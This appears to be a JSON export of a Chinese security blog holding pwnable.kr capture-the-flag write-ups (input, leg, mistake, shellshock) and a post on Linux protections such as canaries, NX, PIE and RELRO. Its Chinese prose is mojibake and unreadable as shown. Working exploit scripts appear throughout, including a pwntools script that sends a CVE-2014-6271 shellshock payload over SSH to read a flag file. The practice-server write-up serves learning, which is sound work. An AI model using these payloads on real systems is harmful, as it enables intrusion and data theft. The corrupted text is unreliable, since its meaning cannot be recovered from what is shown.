ç³»ç»Ÿä¸Šï¼Œæ— è®ºå½“å‰çš„æ–‡ä»¶æŒ‡é’ˆåœ¨ä»€ä¹ˆä½ç½®ï¼Œæ‰€æœ‰ å†™å…¥éƒ½ä¼šè¿½åŠ åˆ°æ–‡ä»¶æœ«å°¾ï¼‰ã€‚åœ¨æ–‡æœ¬æ¨¡å¼ï¼Œå¦‚æœ encoding æ²¡æœ‰æŒ‡å®šï¼Œåˆ™æ ¹æ®å¹³å°æ¥å†³å®šä½¿ç”¨çš„ç¼–ç ï¼šä½¿ç”¨ locale.getpreferredencoding(False) æ¥è·å–æœ¬åœ°ç¼–ç ã€‚ï¼ˆè¦è¯»å–å’Œå†™å…¥åŸå§‹å­—èŠ‚ï¼Œè¯·ä½¿ç”¨äºŒè¿›åˆ¶æ¨¡å¼å¹¶ä¸è¦æŒ‡å®š encodingã€‚ï¼‰å¯ç”¨çš„æ¨¡å¼æœ‰ï¼š å­—ç¬¦ å«ä¹‰ &#39;r&#39; è¯»å–ï¼ˆé»˜è®¤ï¼‰ &#39;w&#39; å†™å…¥ï¼Œå¹¶å…ˆæˆªæ–­æ–‡ä»¶ &#39;x&#39; æ’å®ƒæ€§åˆ›å»ºï¼Œå¦‚æœæ–‡ä»¶å·²å­˜åœ¨åˆ™å¤±è´¥ &#39;a&#39; å†™å…¥ï¼Œå¦‚æœæ–‡ä»¶å­˜åœ¨åˆ™åœ¨æœ«å°¾è¿½åŠ  &#39;b&#39; äºŒè¿›åˆ¶æ¨¡å¼ &#39;t&#39; æ–‡æœ¬æ¨¡å¼ï¼ˆé»˜è®¤ï¼‰ &#39;+&#39; æ›´æ–°ç£ç›˜æ–‡ä»¶ï¼ˆè¯»å–å¹¶å†™å…¥ï¼‰ é»˜è®¤çš„æ¨¡å¼æ˜¯ &#39;r&#39; ï¼ˆæ‰“å¼€å¹¶è¯»å–æ–‡æœ¬ï¼ŒåŒ &#39;rt&#39; ï¼‰ã€‚å¯¹äºäºŒè¿›åˆ¶å†™å…¥ï¼Œ &#39;w+b&#39; æ¨¡å¼æ‰“å¼€å¹¶æŠŠæ–‡ä»¶æˆªæ–­æˆ 0 å­—èŠ‚ï¼› &#39;r+b&#39; åˆ™ä¸ä¼šæˆªæ–­ã€‚ os.pipe() åˆ›å»ºä¸€ä¸ªç®¡é“ï¼Œè¿”å›ä¸€å¯¹åˆ†åˆ«ç”¨äºè¯»å–å’Œå†™å…¥çš„æ–‡ä»¶æè¿°ç¬¦ (r, w)ã€‚ Demo: 123456789101112131415161718192021222324252627282930#!/usr/bin/python# -*- coding: UTF-8 -*-import os, sysprint &quot;The child will write text to a pipe and &quot;print &quot;the parent will read the text written by child...&quot;# file descriptors r, w for reading and writingr, w = os.pipe() processid = os.fork()if processid: # This is the parent process # Closes file descriptor w os.close(w) r = os.fdopen(r) print &quot;Parent reading&quot; str = r.read() print &quot;text =&quot;, str sys.exit(0)else: # This is the child process os.close(r) w = os.fdopen(w, &#x27;w&#x27;) print &quot;Child writing&quot; w.write(&quot;Text written by child...&quot;) w.close() print &quot;Child closing&quot; sys.exit(0) socketæ¨¡å— è¿™ä¸ªæ¨¡å—æä¾›äº†è®¿é—®BSDå¥—æ¥å­—çš„æ¥å£ã€‚åœ¨æ‰€æœ‰ç°ä»£Unixç³»ç»Ÿã€Windowsã€macOSå’Œå…¶ä»–ä¸€äº›å¹³å°ä¸Šå¯ç”¨ã€‚ è¿™ä¸ªPythonæ¥å£æ˜¯ç”¨Pythonçš„é¢å‘å¯¹è±¡é£æ ¼å¯¹Unixç³»ç»Ÿè°ƒç”¨å’Œå¥—æ¥å­—åº“æ¥å£çš„ç›´è¯‘ï¼šå‡½æ•°socket() è¿”å›ä¸€ä¸ª å¥—æ¥å­—å¯¹è±¡ ï¼Œå…¶æ–¹æ³•æ˜¯å¯¹å„ç§å¥—æ¥å­—ç³»ç»Ÿè°ƒç”¨çš„å®ç°ã€‚å½¢å‚ç±»å‹ä¸€èˆ¬ä¸Cæ¥å£ç›¸æ¯”æ›´é«˜çº§ï¼šä¾‹å¦‚åœ¨Pythonæ–‡ä»¶ read() å’Œ write() æ“ä½œä¸­ï¼Œæ¥æ”¶æ“ä½œçš„ç¼“å†²åŒºåˆ†é…æ˜¯è‡ªåŠ¨çš„ï¼Œå‘é€æ“ä½œçš„ç¼“å†²åŒºé•¿åº¦æ˜¯éšå¼çš„ã€‚ Demo: 1socket.socket(socket_family,socket_type,protocal=0) family: å¥—æ¥å­—å®¶æ—å¯ä»¥ä½¿ AF_UNIX æˆ–è€… AF_INETã€‚ type: å¥—æ¥å­—ç±»å‹å¯ä»¥æ ¹æ®æ˜¯é¢å‘è¿æ¥çš„è¿˜æ˜¯éè¿æ¥åˆ†ä¸º SOCK_STREAM æˆ– SOCK_DGRAMã€‚ protocol: ä¸€èˆ¬ä¸å¡«é»˜è®¤ä¸º 0ã€‚ socket_familyå‚æ•°ï¼š 1.åŸºäºæ–‡ä»¶ç±»å‹çš„å¥—æ¥å­—å®¶æ— å¥—æ¥å­—å®¶æ—çš„åå­—ï¼šAF_UNIXï¼Œunixä¸€åˆ‡çš†æ–‡ä»¶ï¼ŒåŸºäºæ–‡ä»¶çš„å¥—æ¥å­—è°ƒç”¨çš„å°±æ˜¯åº•å±‚çš„æ–‡ä»¶ç³»ç»Ÿæ¥å–æ•°æ®ï¼Œä¸¤ä¸ªå¥—æ¥å­—è¿›ç¨‹è¿è¡Œåœ¨åŒä¸€æœºå™¨ï¼Œå¯ä»¥é€šè¿‡è®¿é—®åŒä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿé—´æ¥å®Œæˆé€šä¿¡ã€‚ 2.åŸºäºç½‘ç»œç±»å‹çš„å¥—æ¥å­—å®¶æ— å¥—æ¥å­—å®¶æ—çš„åå­—ï¼šAF_INETï¼Œè¿˜æœ‰AF_INET6è¢«ç”¨äºipv6ï¼Œè¿˜æœ‰ä¸€äº›å…¶ä»–çš„åœ°å€å®¶æ—ï¼Œä¸è¿‡ï¼Œä»–ä»¬è¦ä¹ˆæ˜¯åªç”¨äºæŸä¸ªå¹³å°ï¼Œè¦ä¹ˆå°±æ˜¯å·²ç»è¢«åºŸå¼ƒï¼Œæˆ–è€…æ˜¯å¾ˆå°‘è¢«ä½¿ç”¨ï¼Œæˆ–è€…æ˜¯æ ¹æœ¬æ²¡æœ‰å®ç°ï¼Œæ‰€æœ‰åœ°å€å®¶æ—ä¸­ï¼ŒAF_INETæ˜¯ä½¿ç”¨æœ€å¹¿æ³›çš„ä¸€ä¸ªï¼Œpythonæ”¯æŒå¾ˆå¤šç§åœ°å€å®¶æ—ï¼Œä½†æ˜¯ç”±äºæˆ‘ä»¬åªå…³å¿ƒç½‘ç»œç¼–ç¨‹ï¼Œæ‰€ä»¥å¤§éƒ¨åˆ†æ—¶å€™æˆ‘ä¹ˆåªä½¿ç”¨AF_INETã€‚ typeæŒ‡çš„æ˜¯å¥—æ¥å­—ç±»å‹ï¼Œå¸¸ç”¨çš„ç±»å‹æœ‰ï¼š SOCK_STREAMï¼ˆTCPæµï¼‰ SOCK_DGRAMï¼ˆUDPæ•°æ®æŠ¥ï¼‰ SOCK_RAWï¼ˆåŸå§‹å¥—æ¥å­—ï¼‰æœ€åä¸€ä¸ª â€œprotocolâ€ä¸€èˆ¬è®¾ç½®ä¸ºâ€œ0â€ï¼Œä¹Ÿå°±æ˜¯å½“ç¡®å®šå¥—æ¥å­—ä½¿ç”¨çš„åè®®ç°‡å’Œç±»å‹æ—¶ï¼Œè¿™ä¸ªå‚æ•°çš„å€¼å°±ä¸º0ï¼Œä½†æ˜¯æœ‰æ—¶å€™åˆ›å»ºåŸå§‹å¥—æ¥å­—æ—¶ï¼Œå¹¶ä¸çŸ¥é“è¦ä½¿ç”¨çš„åè®®ç°‡å’Œç±»å‹ï¼Œä¹Ÿå°±æ˜¯domainå‚æ•°æœªçŸ¥æƒ…å†µä¸‹ï¼Œè¿™æ—¶protocolè¿™ä¸ªå‚æ•°å°±èµ·ä½œç”¨äº†ï¼Œå®ƒå¯ä»¥ç¡®å®šåè®®çš„ç§ç±»ã€‚ socketæ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œé‚£ä¹ˆå®ƒä¹Ÿæœ‰è¿”å›å€¼ï¼Œå½“å¥—æ¥å­—åˆ›å»ºæˆåŠŸæ—¶ï¼Œè¿”å›å¥—æ¥å­—ï¼Œå¤±è´¥è¿”å›â€œ-1â€ï¼Œé”™è¯¯ä»£ç åˆ™å†™å…¥â€œerrnoâ€ä¸­ã€‚ ä¸€äº›socketå‡½æ•°: socket.connect(adress): è¿æ¥åˆ° address å¤„çš„è¿œç¨‹å¥—æ¥å­—ã€‚address çš„æ ¼å¼å–å†³äºåœ°å€ç°‡) socket.send(bytes[,flags]) å‘é€æ•°æ®ç»™å¥—æ¥å­—ã€‚æœ¬å¥—æ¥å­—å¿…é¡»å·²è¿æ¥åˆ°è¿œç¨‹å¥—æ¥å­—ã€‚ socket.close(fd) å…³é—­ä¸€ä¸ªå¥—æ¥å­—æ–‡ä»¶æè¿°ç¬¦ã€‚å®ƒç±»ä¼¼äºos.close()ï¼Œä½†æ˜¯ä¸“ç”¨äºå¥—æ¥å­— Exp: åœ¨/tempæ–‡ä»¶å¤¹å‘ç°çš„pythonå†™çš„expâ€¦ 123456789101112131415161718192021222324252627282930313233343536373839#argc=100#argv[&#x27;A&#x27;]=&#x27;x00&#x27;#argv[&#x27;B&#x27;]=&#x27;\\x20\\x0a\\x0d&#x27;argc = list(&#x27;A&#x27;) * 100argc[ord(&#x27;A&#x27;)] = &#x27;&#x27;argc[ord(&#x27;B&#x27;)] = b&#x27;\\x20\\x0a\\x0d&#x27; #set socket portargc[ord(&#x27;C&#x27;)] = &quot;5555&quot;argc[0] = &#x27;/home/input2/input&#x27;#2import osstdin_r, stdin_w = os.pipe()stderr_r, stderr_w = os.pipe()os.write(stdin_w, b&#x27;\\x00\\x0a\\x00\\xff&#x27;)os.write(stderr_w, b&#x27;\\x00\\x0a\\x02\\xff&#x27;)#3environ = &#123;b&#x27;\\xde\\xad\\xbe\\xef&#x27; : b&#x27;\\xca\\xfe\\xba\\xbe&#x27;&#125;#4f = open(b&#x27;\\x0a&#x27;,&#x27;wb&#x27;)f.write(b&#x27;\\x00\\x00\\x00\\x00&#x27;)f.close()import subprocessimport timesh = subprocess.Popen(argc, stdin = stdin_r, stderr = stderr_r, env = environ)time.sleep(2)#5import sockets = socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.connect((&#x27;127.0.0.1&#x27;,5555))s.send(b&#x27;\\xde\\xad\\xbe\\xef&#x27;)s.close() å¦å¤–ä¸€ä¸ªTipsï¼š tæƒé™ï¼ˆç²˜ç€ä½SBITï¼‰ï¼šä»»ä½•äººåœ¨è¯¥ç›®å½•ä¸‹æœ‰å†™æƒé™ï¼Œä½†æ˜¯æ™®é€šç”¨æˆ·ä¸èƒ½åˆ é™¤åˆ«äººçš„æ–‡ä»¶ æŸ¥çœ‹åˆ°tmpç›®å½•ä¸‹æ™®é€šç”¨æˆ·æœ‰-wtæƒé™ï¼Œæˆ‘ä»¬è¿›å…¥tmpç›®å½•ååˆ›å»ºè‡ªå·±çš„ä¸€ä¸ªç›®å½•ç„¶åæ‰§è¡Œa.py æ³¨æ„åˆ°å½“å‰ç›®å½•ä¸‹å¹¶æ²¡æœ‰flagï¼Œæˆ‘ä»¬éœ€è¦åˆ›å»ºè½¯è¿æ¥ 1ln /home/input/flag flag legARMæ±‡ç¼–ï¼š è¿™ç¯‡ä¸€æ­¥åˆ°ä½ã€‚ç‚¹æˆ‘ 1234567891011(gdb) disass key1Dump of assembler code for function key1: 0x00008cd4 &lt;+0&gt;: push &#123;r11&#125; ; (str r11, [sp, #-4]!) 0x00008cd8 &lt;+4&gt;: add r11, sp, #0 0x00008cdc &lt;+8&gt;: mov r3, pc 0x00008ce0 &lt;+12&gt;: mov r0, r3 0x00008ce4 &lt;+16&gt;: sub sp, r11, #0 0x00008ce8 &lt;+20&gt;: pop &#123;r11&#125; ; (ldr r11, [sp], #4) 0x00008cec &lt;+24&gt;: bx lrEnd of assembler dump. 1.è¿”å›å€¼å­˜å‚¨åœ¨r0å¯„å­˜å™¨ ARMå¤„ç†å™¨æœ‰ä¸¤ç§å·¥ä½œçŠ¶æ€ï¼šARMçŠ¶æ€å’ŒThumbçŠ¶æ€ã€‚å¤„ç†å™¨å¯ä»¥åœ¨ä¸¤ç§çŠ¶æ€ä¸‹éšæ„åˆ‡æ¢ã€‚ å¤„äºARMçŠ¶æ€æ—¶ï¼Œæ‰§è¡Œ32ä½å­—å¯¹é½çš„ARMæŒ‡ä»¤ã€‚ å¤„äºThumbçŠ¶æ€æ—¶ï¼Œæ‰§è¡Œ16ä½å¯¹é½çš„ThumbæŒ‡ä»¤ã€‚ 2.ä¸¤ç§å·¥ä½œçŠ¶æ€ï¼š ARM å’Œ Thumb æŒ‡ä»¤é›†çš„åŠ¨æ€åˆ‡æ¢ï¼Œæ˜¯é€šè¿‡ BX æŒ‡ä»¤ä½¿ç”¨ä¸€ä¸ªå¯„å­˜å™¨åä½œä¸ºå‚æ•°æ¥å®Œæˆã€‚ç¨‹åºæ§åˆ¶æƒè¢«è½¬äº¤ç»™è¯¥å¯„å­˜å™¨ä¸­å­˜å‚¨çš„åœ°å€ ( LSB ä½è¢«å±è”½ )ã€‚ å¦‚æœ LSB=1, åˆ™è¿›å…¥ Thumb æŒ‡ä»¤å¤„ç†æ¨¡å¼ï¼› å¦‚æœ LSB=0, åˆ™è¿›å…¥ ARM æŒ‡ä»¤å¤„ç†æ¨¡å¼ã€‚ é€šä¿—ç‚¹è®²å…¶å®å°±æ˜¯BX è·³è½¬çš„åœ°å€æœ€ä½ä½ä¸º1è¿˜æ˜¯0æ¥åˆ¤æ–­æ˜¯è¿›å…¥ThumbæŒ‡ä»¤å¤„ç†æ¨¡å¼è¿˜æ˜¯è¿›äººARMæŒ‡ä»¤å¤„ç†æ¨¡å¼ 3.Thumbæ¨¡å¼ä¸‹PCå€¼=å½“å‰æŒ‡ä»¤åœ°å€å€¼+8 key1=0x00008cdc+8 1234567891011121314151617(gdb) disass key2Dump of assembler code for function key2: 0x00008cf0 &lt;+0&gt;: push &#123;r11&#125; ; (str r11, [sp, #-4]!) 0x00008cf4 &lt;+4&gt;: add r11, sp, #0 0x00008cf8 &lt;+8&gt;: push &#123;r6&#125; ; (str r6, [sp, #-4]!) 0x00008cfc &lt;+12&gt;: add r6, pc, #1 0x00008d00 &lt;+16&gt;: bx r6 ;æ­¤æ—¶r6æœ€åä¸€ä½æ˜¯1,è¿›å…¥ARM thumbæ¨¡å¼ pc&#x3D;adress+4 0x00008d04 &lt;+20&gt;: mov r3, pc 0x00008d06 &lt;+22&gt;: adds r3, #4 0x00008d08 &lt;+24&gt;: push &#123;r3&#125; 0x00008d0a &lt;+26&gt;: pop &#123;pc&#125; 0x00008d0c &lt;+28&gt;: pop &#123;r6&#125; ; (ldr r6, [sp], #4) 0x00008d10 &lt;+32&gt;: mov r0, r3 0x00008d14 &lt;+36&gt;: sub sp, r11, #0 0x00008d18 &lt;+40&gt;: pop &#123;r11&#125; ; (ldr r11, [sp], #4) 0x00008d1c &lt;+44&gt;: bx lrEnd of assembler dump. è¿™é‡Œè¿”å›å€¼ç”±r3ä¼ å…¥ã€‚ç„¶åå†çœ‹ä¸€ä¸‹åœ°å€ 0x00008d00 &lt;+16&gt;è¿™é‡Œï¼Œæœ‰ä¸ªbx r6ï¼Œè€Œr6ç­‰äºpc+1å³0x8d05ï¼Œæœ€ä½ä¸ºä¸º1ï¼Œæ‰€ä»¥æ‰§è¡Œbx r6ä¹‹åä¼šè¿›å…¥thumbæ¨¡å¼ï¼Œè¿™æ ·å°±ä¼šå˜æˆ2å­—èŠ‚å¯¹é½ï¼Œpcå­˜å‚¨ç€å½“å‰æŒ‡ä»¤åŠ 4çš„ä½ç½®ï¼Œå¦‚æ­¤ä¸€æ¥ï¼Œä¸‹é¢çš„mov r3,pcä¸­ï¼Œr3ç­‰äº0x8d04+0x4ã€‚ä¸‹ä¸€æ¡ä¸ºadds r3ï¼Œ#4ï¼Œè¡¨ç¤ºr3 = r3 + 4åæ›´æ–°æ ‡å¿—ä½ï¼Œå› æ­¤r3 = 0x8d04 + 0x4 + 0x4ã€‚ key2=0x8d04 + 0x4 + 0x4 123456789101112(gdb) disass key3Dump of assembler code for function key3: 0x00008d20 &lt;+0&gt;: push &#123;r11&#125; ; (str r11, [sp, #-4]!) 0x00008d24 &lt;+4&gt;: add r11, sp, #0 0x00008d28 &lt;+8&gt;: mov r3, lr 0x00008d2c &lt;+12&gt;: mov r0, r3 0x00008d30 &lt;+16&gt;: sub sp, r11, #0 0x00008d34 &lt;+20&gt;: pop &#123;r11&#125; ; (ldr r11, [sp], #4) 0x00008d38 &lt;+24&gt;: bx lrEnd of assembler dump. æœ€ç»ˆkey3=lrçš„å€¼ lrå¯„å­˜å™¨ä¹Ÿå³R14å¯„å­˜å™¨ï¼Œç”¨ä½œå­ç¨‹åºé“¾æ¥ï¼Œç§°ä¸ºé“¾æ¥å¯„å­˜å™¨LK (Link Register)ã€‚ ä½œç”¨ï¼šä½¿ç”¨BLæˆ–BLXæ—¶ï¼Œè·³è½¬æŒ‡ä»¤è‡ªåŠ¨æŠŠè¿”å›åœ°å€æ”¾å…¥r14ä¸­ï¼›å­ç¨‹åºé€šè¿‡æŠŠr14å¤åˆ¶åˆ°PCæ¥å®ç°è¿”å› åœ¨mainå‡½æ•°æ‰¾åˆ°è°ƒç”¨keyæ—¶çš„ä»£ç  120x00008d7c &lt;+64&gt;: bl 0x8d20 &lt;key3&gt;0x00008d80 &lt;+68&gt;: mov r3, r0 BLæŒ‡ä»¤ï¼š Bæˆ–BLæŒ‡ä»¤å¼•èµ·å¤„ç†å™¨è½¬ç§»åˆ°â€œå­ç¨‹åºåâ€å¤„å¼€å§‹æ‰§è¡Œã€‚ä¸¤è€…çš„ä¸åŒä¹‹å¤„åœ¨äº:(1)BLæŒ‡ä»¤åœ¨è½¬ç§»åˆ°å­ç¨‹åºæ‰§è¡Œä¹‹å‰ï¼Œå°†å…¶ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€æ‹·è´åˆ°R14ï¼ˆLR,é“¾æ¥å¯„å­˜å™¨ï¼‰ã€‚ ç”±äºBLæŒ‡ä»¤ä¿å­˜äº†ä¸‹æ¡æŒ‡ä»¤çš„åœ°å€ï¼Œå› æ­¤ä½¿ç”¨æŒ‡ä»¤â€œMOV PC ,LRâ€å³å¯å®ç°å­ç¨‹åºçš„è¿”å›ã€‚(2)BæŒ‡ä»¤åˆ™æ— æ³•å®ç°å­ç¨‹åºçš„è¿”å›ï¼Œåªèƒ½å®ç°å•çº¯çš„è·³è½¬ã€‚ç”¨æˆ·åœ¨ç¼–ç¨‹çš„æ—¶å€™ï¼Œå¯æ ¹æ®å…·ä½“åº”ç”¨é€‰ç”¨åˆé€‚çš„å­ç¨‹åºè°ƒç”¨è¯­å¥ã€‚ key3=0x8d80 ä¸‰ä¸ªæ•°ç›¸åŠ å³å¯ Exp: 108400 mistakeç¬¦å·ä¼˜å…ˆçº§ç›¸å…³ 1if(!(len=read(fd,pw_buf,PW_LEN) &gt; 0)) æ¯”è¾ƒè¿ç®—ç¬¦ä¼˜å…ˆçº§é«˜äºèµ‹å€¼è¿ç®—ç¬¦ï¼Œå› æ­¤å®é™…ä¸Šfdæœ€ç»ˆå¹¶ä¸æ˜¯ç†æƒ³çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œè€Œæ˜¯0æ‰å¯¹ï¼Œè€Œå¦ä¸€æ–¹é¢ï¼Œ0ä½œä¸ºæ–‡ä»¶æè¿°ç¬¦ï¼Œå®ƒæŒ‡å‘çš„æ˜¯stdinã€‚ ä¸¤ä¸ªè¾“å…¥éƒ½ç”±æˆ‘ä»¬æ„é€ ï¼Œè‡ªç”±å‘æŒ¥å³å¯ã€‚ã€‚ Exp: 1234567891011#coding=utf-8from pwn import *shell=ssh(host=&#x27;pwnable.kr&#x27;,user=&#x27;mistake&#x27;,password=&#x27;guest&#x27;,port=2222)sh=shell.run(&#x27;./mistake&#x27;)payload=&#x27;B&#x27;*10sh.sendafter(&quot;do not bruteforce...\\n&quot;,payload)payload=&#x27;C&#x27;*10sh.sendafter(&quot;input password : &quot;,payload)sh.interactive() shellshockCVE-2014-6271ï¼ˆç ´å£³æ¼æ´ï¼‰é¢å‘Googleè§£é¢˜ Link Exp: 12345678#coding=utf-8from pwn import *shell=ssh(host=&#x27;pwnable.kr&#x27;,user=&#x27;shellshock&#x27;,password=&#x27;guest&#x27;,port=2222)sh=shell.run(&#x27;sh&#x27;)sh.sendline(&quot;env x=&#x27;() &#123; :;&#125;; bash -c \\&quot;cat flag\\&quot; &#x27; ./shellshock&quot;)sh.interactive() coin1blackjacklottocmd1cmd2uafmemcpyasmunlinkblukathorcruxes","categories":[{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/categories/Pwn/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/tags/Pwn/"},{"name":"CTF","slug":"CTF","permalink":"http://example.com/tags/CTF/"}]},{"title":"Linuxç¨‹åºä¿æŠ¤æœºåˆ¶","slug":"Linuxç¨‹åºä¿æŠ¤æœºåˆ¶","date":"2021-04-17T18:32:31.798Z","updated":"2021-04-17T18:48:23.671Z","comments":true,"path":"2021/04/18/Linuxç¨‹åºä¿æŠ¤æœºåˆ¶/","link":"","permalink":"http://example.com/2021/04/18/Linux%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/","excerpt":"","text":"Linuxç¨‹åºä¿æŠ¤æœºåˆ¶â€‹ åœ¨Pwnable.kråˆ·é¢˜çš„è¿‡ç¨‹ä¸­ä¸€ç‚¹ä¸€ç‚¹åœ°äº†è§£äº†linuxç³»ç»Ÿä¸‹çš„ä¸€äº›å®‰å…¨æœºåˆ¶æ¥é™ä½ç¨‹åºå—åˆ°æº¢å‡ºç­‰æ”»å‡»ï¼Œè¿™é‡Œç®€å•åšä¸ªæ€»ç»“ã€‚:) Tools:checksecchecksecæ˜¯ä¸€ä¸ªæ£€æŸ¥linuxç¨‹åºå¼€å¯çš„å®‰å…¨æœºåˆ¶çš„shellè„šæœ¬ï¼Œä¹Ÿå¯ä»¥æ£€æµ‹packerä¿¡æ¯ ï¼ˆDemo: é¢˜ç›®:flag ä¸‹é¢å¯¹é€ä¸ªä»‹ç»ä¿æŠ¤æœºåˆ¶ CANARYâ€‹ åœ¨linuxç¨‹åºä¸­ï¼ŒCANARYæ˜¯ä¸€ç§æ ˆä¿æŠ¤æœºåˆ¶ï¼Œæ ˆä¿æŠ¤æœºåˆ¶å¼€å¯åï¼Œå‡½æ•°æ‰§è¡Œæ—¶ä¼šå…ˆå¾€æ ˆä¸­æ’å…¥éšæœºå€¼ï¼Œè¿™ä¸ªéšæœºå€¼å°±è¢«ç§°ä¸ºCANARYï¼Œå½“å‡½æ•°è¿”å›æ—¶ï¼Œä¼šå…ˆéªŒè¯è¿™ä¸ªéšæœºæ•°æ˜¯å¦è¢«æ›´æ”¹ï¼Œå¦‚æœè¢«æ›´æ”¹è¯´æ˜æœ‰æ ˆæº¢å‡ºè¡Œä¸ºï¼Œå°±ä¼šä½¿ç¨‹åºå¼ºåˆ¶åœæ­¢ï¼Œä»è€Œè§„é¿æ ˆæº¢å‡ºå¸¦æ¥çš„å±å®³ã€‚ â€‹ Functionï¼š 1ã€åœ¨æ‰€æœ‰å‡½æ•°è°ƒç”¨å‘ç”Ÿæ—¶ï¼Œå‘æ ˆå¸§å†…å‹å…¥ä¸€ä¸ªé¢å¤–çš„éšæœº DWORDï¼Œè¿™ä¸ªéšæœºæ•°è¢«ç§°ä½œâ€œcanaryâ€ï¼Œç”¨ IDA åæ±‡ç¼–æ—¶ï¼Œåˆè¢«ç§°ä½œâ€œSecurity Cookieâ€ã€‚ 2ã€canary ä½äº EBP ä¹‹å‰ï¼Œç³»ç»Ÿè¿˜ä¼šåœ¨.data çš„å†…å­˜åŒºåŸŸä¸­å­˜æ”¾ä¸€ä¸ª canary çš„å‰¯æœ¬ã€‚ 3ã€ å½“æ ˆä¸­å‘ç”Ÿæº¢å‡ºæ—¶ï¼Œcanary å°†è¢«é¦–å…ˆæ·¹æ²¡ï¼Œä¹‹åæ‰æ˜¯ EBP å’Œè¿”å›åœ°å€ã€‚ 4ã€ åœ¨å‡½æ•°è¿”å›ä¹‹å‰ï¼Œç³»ç»Ÿå°†æ‰§è¡Œä¸€ä¸ªé¢å¤–çš„å®‰å…¨éªŒè¯æ“ä½œï¼Œç§°ä½œ Security Checkã€‚ 5ã€åœ¨ Security Check è¿‡ç¨‹ä¸­ï¼Œç³»ç»Ÿå°†æ¯”è¾ƒæ ˆå¸§ä¸­åŸå…ˆå­˜æ”¾çš„ canary å’Œ.data ä¸­å‰¯æœ¬çš„å€¼ï¼Œè‹¥ä¸¤è€…ä¸åŒï¼Œåˆ™è¯´æ˜æ ˆä¸­å‘ç”Ÿäº†æº¢å‡ºï¼Œç³»ç»Ÿå°†è¿›å…¥å¼‚å¸¸å¤„ç†æµç¨‹ï¼Œå‡½æ•°ä¸ä¼šæ­£å¸¸è¿”å›ã€‚ FORTIFYFORTIFYæœºåˆ¶ç”¨äºæ£€æŸ¥ç¨‹åºæ˜¯å¦å­˜åœ¨ç¼“å†²åŒºæº¢å‡ºé”™è¯¯ã€‚è¿™æ˜¯ä¸€ä¸ªç”±GCCå®ç°çš„æºç çº§åˆ«çš„ä¿æŠ¤æœºåˆ¶ï¼Œå…¶åŠŸèƒ½æ˜¯åœ¨ç¼–è¯‘çš„æ—¶å€™æ£€æŸ¥æºç ä»¥é¿å…æ½œåœ¨çš„ç¼“å†²åŒºæº¢å‡ºç­‰é”™è¯¯ã€‚é€‚ç”¨äºmemcpyï¼Œmemsetï¼Œstpcpyï¼Œstrcpyï¼Œstrncpyï¼Œstrcatï¼Œstrncatï¼Œsprintfï¼Œsnprintfï¼Œvsprintfï¼Œvsnprintfï¼Œgetsç­‰å‡½æ•°ã€‚ åœ¨å‡½æ•°ç¼–è¯‘æ—¶ï¼ŒåŠ å…¥FORTIFYæœºåˆ¶çš„ä»£ç ä¼šåœ¨ç¼–è¯‘è¿‡ç¨‹ä¸­è‡ªåŠ¨æ·»åŠ ä¸€éƒ¨åˆ†ä»£ç ï¼Œåˆ¤æ–­æ•°ç»„çš„å¤§å°ï¼Œå‰Šå‡ç¼“å†²åŒºæº¢å‡ºçš„å±å®³ã€‚ gccç¼–è¯‘æ—¶ï¼Œé»˜è®¤ä¸å¼€å¯FORTIFYæœºåˆ¶ï¼Œå¯é€šè¿‡ç¼–è¯‘é€‰é¡¹é€‰æ‹©å¼€å¯çš„FORTIFYæœºåˆ¶å¼ºåº¦ NXNX:no-excuteä¸å¯æ‰§è¡Œ åŸºæœ¬åŸç†æ˜¯å°†æ•°æ®æ‰€åœ¨å†…å­˜é¡µæ ‡è¯†ä¸ºä¸å¯æ‰§è¡Œï¼Œå½“ç¨‹åºæº¢å‡ºæˆåŠŸè½¬å…¥shellcodeæ—¶ï¼Œç¨‹åºä¼šå°è¯•åœ¨æ•°æ®é¡µé¢ä¸Šæ‰§è¡ŒæŒ‡ä»¤ï¼Œæ­¤æ—¶CPUå°±ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œè€Œä¸æ˜¯å»æ‰§è¡Œæ¶æ„æŒ‡ä»¤ã€‚ PIEï¼ˆASLRï¼‰PIEä¸€èˆ¬ä¸ASLRåœ°å€åˆ†å¸ƒéšæœºåŒ–(address space layout randomization)åŒæ—¶å·¥ä½œ å†…å­˜åœ°å€éšæœºåŒ–æœºåˆ¶å‡ ç§æƒ…å†µï¼š1230 - è¡¨ç¤ºå…³é—­è¿›ç¨‹åœ°å€ç©ºé—´éšæœºåŒ–ã€‚1 - è¡¨ç¤ºå°†mmapçš„åŸºå€ï¼Œstackå’Œvdsoé¡µé¢éšæœºåŒ–ã€‚2 - è¡¨ç¤ºåœ¨1çš„åŸºç¡€ä¸Šå¢åŠ æ ˆï¼ˆheapï¼‰çš„éšæœºåŒ–ã€‚ RELRORELRO:read only relocation ç”±linkeræŒ‡å®šbinaryçš„ä¸€å—ç»è¿‡dynamic linkerå¤„ç†è¿‡ relocationä¹‹åçš„åŒºåŸŸä¸ºåªè¯». ä½œç”¨ï¼šè®¾ç½®ç¬¦å·é‡å®šå‘è¡¨æ ¼ä¸ºåªè¯»æˆ–åœ¨ç¨‹åºå¯åŠ¨æ—¶å°±è§£æå¹¶ç»‘å®šæ‰€æœ‰åŠ¨æ€ç¬¦å·ï¼Œä»è€Œå‡å°‘å¯¹GOTï¼ˆGlobal Offset Tableï¼‰æ”»å‡»ã€‚RELROä¸ºâ€ Partial RELROâ€ï¼Œè¯´æ˜æˆ‘ä»¬å¯¹GOTè¡¨å…·æœ‰å†™æƒé™ã€‚ Summaryäº†è§£ä»¥ä¸Šå†…å­˜ä¿æŠ¤æœºåˆ¶çš„ä¿¡æ¯ä¼šä¸ºæˆ‘ä»¬pwnæä¾›ä¸€äº›ä¿¡æ¯ã€‚","categories":[{"name":"linux","slug":"linux","permalink":"http://example.com/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://example.com/tags/linux/"},{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/tags/Pwn/"},{"name":"ç¨‹åºä¿æŠ¤æœºåˆ¶","slug":"ç¨‹åºä¿æŠ¤æœºåˆ¶","permalink":"http://example.com/tags/%E7%A8%8B%E5%BA%8F%E4%BF%9D